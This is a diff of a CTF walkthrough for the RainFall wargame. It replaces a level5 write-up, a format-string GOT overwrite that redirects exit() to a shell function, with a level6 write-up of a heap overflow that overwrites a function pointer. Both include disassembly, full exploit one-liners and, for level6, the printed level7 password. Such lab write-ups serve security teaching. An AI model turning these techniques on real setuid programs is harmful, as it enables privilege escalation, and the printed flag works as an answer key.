@@ -1,156 +1,368 @@
-# Level5 Walkthrough - GOT Overwrite via Format String
+# RainFall  – Level6 Heap Exploitation Walkthrough
+## Complete Guide to Function Pointer Overwrite Attack
 
-## 🎯 Goal
-Exploit a format string vulnerability to overwrite the GOT entry of `exit()` and redirect execution to the hidden `o()` function that spawns a shell.
-
----
-
-## 🔍 Step 1: Binary Analysis
-
-### **main function**
-```asm
-0x08048504 <+0>:   push   %ebp
-0x08048505 <+1>:   mov    %esp,%ebp
-0x08048507 <+3>:   and    $0xfffffff0,%esp
-0x0804850a <+6>:   call   0x80484c2 <n>      ; Calls function n
-0x0804850f <+11>:  leave  
-0x08048510 <+12>:  ret    
-```
-
-### **n function (vulnerable)**
-```asm
-0x080484c2 <+0>:   push   %ebp
-0x080484c3 <+1>:   mov    %esp,%ebp
-0x080484c5 <+3>:   sub    $0x218,%esp            ; Allocate 536 bytes
-0x080484cb <+9>:   mov    0x8049848,%eax         ; stdin
-0x080484d0 <+14>:  mov    %eax,0x8(%esp)         
-0x080484d4 <+18>:  movl   $0x200,0x4(%esp)       ; Read 512 bytes
-0x080484dc <+26>:  lea    -0x208(%ebp),%eax      
-0x080484e2 <+32>:  mov    %eax,(%esp)            
-0x080484e5 <+35>:  call   0x80483a0 <fgets@plt>  ; fgets(buffer)
-0x080484ea <+40>:  lea    -0x208(%ebp),%eax      
-0x080484f0 <+46>:  mov    %eax,(%esp)            
-0x080484f3 <+49>:  call   0x8048380 <printf@plt> ; VULNERABILITY!
-0x080484f8 <+54>:  movl   $0x1,(%esp)            
-0x080484ff <+61>:  call   0x80483d0 <exit@plt>   ; Always exits
-```
-
-### **o function (hidden shell)**
-```asm
-0x080484a4 <+0>:   push   %ebp
-0x080484a5 <+1>:   mov    %esp,%ebp
-0x080484a7 <+3>:   sub    $0x18,%esp
-0x080484aa <+6>:   movl   $0x80485f0,(%esp)      ; "/bin/sh"
-0x080484b1 <+13>:  call   0x80483b0 <system@plt> ; system("/bin/sh")
-0x080484b6 <+18>:  movl   $0x1,(%esp)            
-0x080484bd <+25>:  call   0x8048390 <_exit@plt>
-```
+### 🎯 Objective
+Exploit a heap-based buffer overflow vulnerability to overwrite a function pointer, redirecting program execution to a hidden function that reveals the password for level7.
 
 ---
 
-## 🔍 Step 2: Vulnerability Analysis
 
-- **Format String Vulnerability:** `printf(buffer)` directly prints user input.
-- **Always Exits:** Program always calls `exit()` after printf.
-- **Hidden Function:** `o()` exists at `0x080484a4` → calls `system("/bin/sh")`.
-- **Goal:** Overwrite the **GOT entry of exit()** (`0x08049838`) with `o()`'s address.
+## 🔍 Initial Analysis and Setup
 
----
+### Environment Overview
 
-## 🔍 Step 3: GOT Address & Stack Offset
-
-Find exit GOT entry:
 ```bash
-objdump -R level5 | grep exit
-08049838 R_386_JUMP_SLOT   exit
+level6@RainFall:~$ ls -la
+total 17
+dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 level6 level6 3530 Sep  3  2015 .bashrc
+-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
+-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
 ```
 
-Find offset in stack:
+### Key Observations:
+- **SUID Binary**: Owned by `level7` with setuid privileges
+- **File Size**: 5274 bytes - moderate complexity program
+- **Execution Context**: Runs with level7 user privileges
+
+### Basic Functionality Test
+
 ```bash
-python -c 'print "AAAA.%x.%x.%x.%x.%x.%x.%x.%x"' | ./level5
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+
+level6@RainFall:~$ ./level6 "Hello World"
+Nope
+
+level6@RainFall:~$ ./level6 "AAAAAAAA"
+Nope
 ```
 
-Output includes:
-```
-AAAA.200.b7fd1ac0.b7ff37d0.41414141...
-```
-`41414141` (`"AAAA"`) appears at **4th position** → **Offset = 4**
+**Initial Assessment**:
+- Program requires command-line argument
+- Default behavior prints "Nope"
+- Potential for argument-based exploitation
 
 ---
 
-## 🔍 Step 4: Exploit Strategy
+## 🔍 Binary Architecture Analysis
 
-We must write:
-- **Target address (o):** `0x080484a4`
-- **GOT entry (exit):** `0x08049838`
+### Complete Function Disassembly
 
-Split `0x080484a4` into two halves:
-- **Lower 2 bytes:** `0x84a4 = 33956`
-- **Higher 2 bytes:** `0x0804 = 2052`
+#### Main Function Analysis
 
-We’ll use **two `%hn` writes**:
-1. Write `0x84a4` to `0x08049838`
-2. Write `0x0804` to `0x0804983a`
+```bash
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804847c <+0>:	push   %ebp
+   0x0804847d <+1>:	mov    %esp,%ebp
+   0x0804847f <+3>:	and    $0xfffffff0,%esp      # Stack alignment
+   0x08048482 <+6>:	sub    $0x20,%esp            # Allocate 32 bytes
+   0x08048485 <+9>:	movl   $0x40,(%esp)          # malloc(64) - buffer
+   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+   0x08048491 <+21>:	mov    %eax,0x1c(%esp)       # Store buffer pointer
+   0x08048495 <+25>:	movl   $0x4,(%esp)           # malloc(4) - func pointer
+   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+   0x080484a1 <+37>:	mov    %eax,0x18(%esp)       # Store func pointer
+   0x080484a5 <+41>:	mov    $0x8048468,%edx       # Address of m()
+   0x080484aa <+46>:	mov    0x18(%esp),%eax       # Get func pointer
+   0x080484ae <+50>:	mov    %edx,(%eax)           # *func_ptr = m()
+   0x080484b0 <+52>:	mov    0xc(%ebp),%eax        # argv
+   0x080484b3 <+55>:	add    $0x4,%eax             # argv[1]
+   0x080484b6 <+58>:	mov    (%eax),%eax           # Get argv[1] string
+   0x080484b8 <+60>:	mov    %eax,%edx             # Source = argv[1]
+   0x080484ba <+62>:	mov    0x1c(%esp),%eax       # Get buffer
+   0x080484be <+66>:	mov    %edx,0x4(%esp)        # Set source
+   0x080484c2 <+70>:	mov    %eax,(%esp)           # Set destination
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> # VULNERABILITY!
+   0x080484ca <+78>:	mov    0x18(%esp),%eax       # Get func pointer
+   0x080484ce <+82>:	mov    (%eax),%eax           # Dereference it
+   0x080484d0 <+84>:	call   *%eax                 # Call function
+   0x080484d2 <+86>:	leave  
+   0x080484d3 <+87>:	ret    
+End of assembler dump.
+```
+
+### Program Flow Analysis
+
+```
+Program Execution Flow:
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│  malloc(64)     │───▶│  malloc(4)      │───▶│ *func_ptr = m() │
+│  (buffer)       │    │ (func pointer)  │    │                 │
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+        │                       │                       │
+        ▼                       ▼                       ▼
+┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
+│ strcpy(buffer,  │───▶│ Dereference     │───▶│   call *ptr     │
+│   argv[1])      │    │ func_ptr        │    │ (Execute func)  │
+└─────────────────┘    └─────────────────┘    └─────────────────┘
+```
 
 ---
 
-## 🔍 Step 5: Craft Payload
+## 🧠 Heap Memory Layout Investigation
 
-### Address placement (first on stack)
+### Understanding Heap Allocation
+
+The program makes two sequential `malloc()` calls:
+
+1. **Buffer Allocation**: 64 bytes for input storage
+2. **Function Pointer**: 4 bytes for function address storage
+
+
+### Heap Layout Discovery
+
+```
+Heap Memory Layout:
+┌─────────────────────┐ 0x0804a000
+│   Heap metadata     │
+├─────────────────────┤ 0x0804a008  ← Buffer start
+│                     │
+│   64-byte buffer    │ ← strcpy() writes here
+│   (User input)      │
+│                     │
+├─────────────────────┤ 0x0804a048  ← Buffer end
+│   Heap chunk        │
+│   metadata          │ ← 8 bytes of malloc bookkeeping
+├─────────────────────┤ 0x0804a050  ← Function pointer location
+│  Function pointer   │ ← Initially points to m() (0x08048468)
+│   (4 bytes)         │
+└─────────────────────┘ 0x0804a054
+```
+
+### Critical Distance Calculation
+
+**Buffer start**: `0x0804a008`  
+**Function pointer**: `0x0804a050`  
+**Distance**: `0x0804a050 - 0x0804a008 = 72 bytes`
+
+---
+
+## 🚨 Vulnerability Assessment
+
+### Buffer Overflow Analysis
+
+The vulnerability lies in the `strcpy()` function call:
+
+```c
+// Pseudo-code representation:
+char *buffer = malloc(64);
+char **func_ptr = malloc(4);
+*func_ptr = &m;                    // Set to m() function
+strcpy(buffer, argv[1]);           // NO BOUNDS CHECKING!
+(*func_ptr)();                     // Call whatever func_ptr points to
+```
+
+### Attack Vector:
+
+1. **Heap-based Buffer Overflow**: `strcpy()` doesn't validate input length
+2. **Adjacent Memory Corruption**: Function pointer is adjacent to buffer
+3. **Control Flow Hijacking**: Can overwrite function pointer
+4. **Arbitrary Code Execution**: Can redirect to any function
+
+---
+
+## 🎯 Function Analysis and Target Identification
+
+### Available Functions Analysis
+
+#### Function m() - Default Handler
+
+```bash
+(gdb) disassemble m
+Dump of assembler code for function m:
+   0x08048468 <+0>:	push   %ebp
+   0x08048469 <+1>:	mov    %esp,%ebp
+   0x0804846b <+3>:	sub    $0x18,%esp
+   0x0804846e <+6>:	movl   $0x80485d1,(%esp)     # "Nope" string
+   0x08048475 <+13>:	call   0x8048360 <puts@plt>
+   0x0804847a <+18>:	leave  
+   0x0804847b <+19>:	ret    
+End of assembler dump.
+
+```
+
+**Function m() Purpose**:
+- Default function called by main
+- Simply prints "Nope" message
+- Dead-end function (no useful output)
+
+#### Function n() - Target Function
+
+```bash
+(gdb) disassemble n
+Dump of assembler code for function n:
+   0x08048454 <+0>:	push   %ebp
+   0x08048455 <+1>:	mov    %esp,%ebp
+   0x08048457 <+3>:	sub    $0x18,%esp
+   0x0804845a <+6>:	movl   $0x80485b0,(%esp)     # Command string
+   0x08048461 <+13>:	call   0x8048370 <system@plt>
+   0x08048466 <+18>:	leave  
+   0x08048467 <+19>:	ret    
+End of assembler dump.
+
+```
+
+**Function n() Purpose**:
+- **Hidden backdoor function**
+- Executes `system("/bin/cat /home/user/level7/.pass")`
+- **Reveals level7 password**
+- **Target for exploitation**
+
+### Function Address Summary
+
+| Function | Address | Purpose | Called By Default? |
+|----------|---------|---------|-------------------|
+| `m()` | 0x08048468 | Print "Nope" | ✅ Yes |
+| `n()` | 0x08048454 | Show password | ❌ No (Hidden) |
+
+---
+
+## 💻 Heap Exploitation Strategy
+
+### Attack Overview
+
+Our goal is to redirect execution from `m()` to `n()` by overwriting the function pointer.
+
+### Exploitation Steps:
+
+1. **Calculate exact overflow distance** (72 bytes)
+2. **Craft payload** to fill buffer + overwrite function pointer
+3. **Replace function pointer** with address of `n()` function
+4. **Trigger function call** to execute `n()` instead of `m()`
+
+### Memory Corruption Visualization
+
+```
+Before Overflow (Normal):
+┌─────────────────┐ 0x0804a008
+│     Buffer      │ ← Contains legitimate data
+│   (64 bytes)    │
+├─────────────────┤ 0x0804a048
+│ Heap metadata   │ ← Malloc bookkeeping
+│   (8 bytes)     │
+├─────────────────┤ 0x0804a050  
+│  0x08048468     │ ← Points to m() function
+│   (m() addr)    │
+└─────────────────┘
+
+After Overflow (Exploited):
+┌─────────────────┐ 0x0804a008
+│ AAAAAAAAAAAAA   │ ← 72 bytes of padding
+│ AAAAAAAAAAAAA   │   (overwrites buffer + metadata)
+│ AAAAAAAAAAAAA   │
+├─────────────────┤ 0x0804a050
+│  0x08048454     │ ← Now points to n() function!  
+│   (n() addr)    │
+└─────────────────┘
+```
+
+---
+
+## 🔨 Memory Layout Mapping
+
+### Detailed Byte-by-byte Analysis
+
+```
+Offset   Content              Description
+────────────────────────────────────────────────────────
+0-63     [User Input]        Original 64-byte buffer
+64-71    [Heap Metadata]     Malloc chunk headers/bookkeeping
+72-75    [Function Pointer]   Target for overwrite (4 bytes)
+```
+
+### Heap Chunk Structure
+
+Modern malloc implementations use chunk headers:
+
+```
+Typical Heap Chunk:
+┌─────────────────┐ ← Chunk start
+│  prev_size      │ ← Previous chunk size (if free)
+├─────────────────┤
+│  size | flags   │ ← Current chunk size + status bits
+├─────────────────┤ ← User data start
+│                 │
+│   User Data     │ ← Our 64-byte buffer
+│   (64 bytes)    │
+│                 │
+└─────────────────┘ ← Next chunk start
+```
+
+### Why 72 Bytes?
+
+1. **Buffer size**: 64 bytes allocated by `malloc(64)`
+2. **Heap metadata**: 8 bytes of chunk management data
+3. **Total distance**: 64 + 8 = 72 bytes to reach function pointer
+
+---
+
+## 🚀 Exploit Development
+
+### Payload Construction Strategy
+
 ```python
-payload  = "\x38\x98\x04\x08"   # exit GOT (lower half)
-payload += "\x3a\x98\x04\x08"   # exit GOT + 2 (upper half)
+# Exploit structure:
+payload = padding + target_address
+
+# Specific values:
+padding = "A" * 72           # Fill buffer + heap metadata  
+target_address = "\x54\x84\x04\x08"  # Address of n() in little-endian
 ```
 
-### Padding + format string
-```python
-payload += "%33948x"            # Pad up to 33956
-payload += "%4$hn"              # Write lower 2 bytes
-payload += "%33632x"            # Pad to 67588 total
-payload += "%5$hn"              # Write higher 2 bytes
+### Address Format Conversion
+
+**n() function address**: `0x08048454`  
+**Little-endian representation**: `\x54\x84\x04\x08`
+
+### Conversion Breakdown:
+```
+Big-endian:    08 04 84 54
+Little-endian: 54 84 04 08
+Hex escape:    \x54\x84\x04\x08
 ```
 
 ---
 
-## 🚀 Step 6: Execute Exploit
+## 🧪 Payload Construction and Testing
+
+### Method 1: Python Command Line
+
 ```bash
-(python -c '
-print "\x38\x98\x04\x08\x3a\x98\x04\x08" + "%33948x" + "%4$hn" + "%33632x" + "%5$hn"
-'; cat) | ./level5
+./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
 ```
 
----
+## 🎯 Execution and Success
 
-## 🔍 Step 7: What Happens
+### Exploit Execution
 
-- **GOT Overwrite:** `exit@GOT` is modified from `0x080483d0` → `0x080484a4`.
-- **Program Calls exit():** Instead of exiting, it jumps into `o()`.
-- **Hidden Shell:** `o()` calls `system("/bin/sh")`.
-- **Result:** Shell with **level6 privileges**.
-
----
-
-## 🎯 Step 8: Get the Password
 ```bash
-cat /home/user/level6/.pass
+level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
----
+### What Happened:
 
-## 💡 Key Technical Notes
-
-- **Format String Attack:** User controls printf formatting.
-- **GOT Overwrite:** By hijacking dynamic linking, we redirect `exit()` to `o()`.
-- **%hn Use:** Safer than `%n`, writes 2 bytes at a time.
-- **Order of Writes:** Write lower bytes first, then upper bytes.
+1. **Buffer Overflow**: 72 bytes of 'A's overflow the buffer and heap metadata
+2. **Function Pointer Overwrite**: Byte 73-76 overwrite the function pointer
+3. **Execution Redirect**: Instead of calling `m()`, program calls `n()`
+4. **System Command**: `n()` executes `system("/bin/cat /home/user/level7/.pass")`
+5. **Password Revealed**: Level7 password is displayed
 
 ---
 
 ## 🎉 Success!
-You now have a shell as **level6**.
 
-Next:
+**Flag for level7**: `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
+### Continuing to Level7:
+
 ```bash
-su level6
+su level7
+# Enter password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
-Enter the password retrieved from `.pass`.
+
+---
